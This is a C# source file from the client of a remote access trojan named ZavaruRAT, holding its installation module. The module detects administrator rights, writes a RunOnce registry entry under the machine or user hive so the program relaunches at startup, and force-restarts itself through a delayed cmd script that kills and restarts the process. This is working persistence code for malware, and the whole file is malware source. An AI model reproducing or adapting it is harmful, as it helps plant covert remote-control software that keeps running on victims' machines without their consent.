#region

using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

#endregion

namespace ZavaruRAT.Client;

public static class Installation
{
    public static readonly string ExecutablePath = Environment.ProcessPath!;
    public static readonly string ExecutableFolder = Path.GetDirectoryName(ExecutablePath)!;
    public static readonly string ExecutableName = Path.GetFileName(ExecutablePath);

    public static bool IsAdministrator =>
        new WindowsPrincipal(WindowsIdentity.GetCurrent())
            .IsInRole(WindowsBuiltInRole.Administrator);

    public static bool AddAutoStart()
    {
        if (!Config.AutoStart)
        {
            return false;
        }

        try
        {
            var key = IsAdministrator ? Registry.LocalMachine : Registry.CurrentUser;
            Debug.WriteLine("Using {0}", key);

            var subkey = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
            subkey?.SetValue(Config.AutoStartName, ExecutablePath);

            return true;
        }
        catch (Exception e)
        {
            Debug.WriteLine("Error while adding to startup");
            Debug.WriteLine(e);

            return false;
        }
    }

    public static void ForceRemoveAutoStart()
    {
        try
        {
            Registry.LocalMachine
                    .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce")
                    ?.DeleteValue(Config.AutoStartName, false);
        }
        catch (Exception e)
        {
            Debug.WriteLine("Error while deleting from Registry.LocalMachine");
            Debug.WriteLine(e);
        }

        try
        {
            Registry.CurrentUser
                    .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce")
                    ?.DeleteValue(Config.AutoStartName, false);
        }
        catch (Exception e)
        {
            Debug.WriteLine("Error while deleting from Registry.CurrentUser");
            Debug.WriteLine(e);
        }
    }

    public static void Restart()
    {
        var currentExe = ExecutablePath;
        var currentPid = Environment.ProcessId;

        var cmd = $@"
ping 127.0.0.1 -n 2 > nul
taskkill /pid {currentPid} /f
ping 127.0.0.1 -n 3 > nul
start {currentExe}
".Commandify();

        Debug.WriteLine(cmd);

        var procInfo = new ProcessStartInfo
        {
            FileName = "cmd",
            Arguments = "/c " + cmd,
            WorkingDirectory = Path.GetDirectoryName(currentExe)
        };
        Process.Start(procInfo);

        throw new ApplicationException("See you in 5 seconds!");
    }
}
